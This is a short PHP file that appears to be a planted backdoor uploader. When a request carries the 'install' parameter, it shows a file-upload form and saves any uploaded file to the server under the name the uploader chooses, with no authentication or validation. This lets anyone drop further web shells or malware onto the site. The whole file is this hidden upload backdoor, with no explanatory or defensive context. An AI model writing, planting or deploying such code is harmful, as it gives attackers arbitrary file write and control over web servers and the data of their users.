<?php 
if(isset($_GET['install'])){
	echo "<form action='' method='post' enctype='multipart/form-data' name='uper' id='uper'><input type='file' name='file'><input name='_upl' type='submit' id='_upl' value='up'></form>";if($_POST['_upl']=='up') {if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {echo '<b>up!!!</b><br><br>';}}
}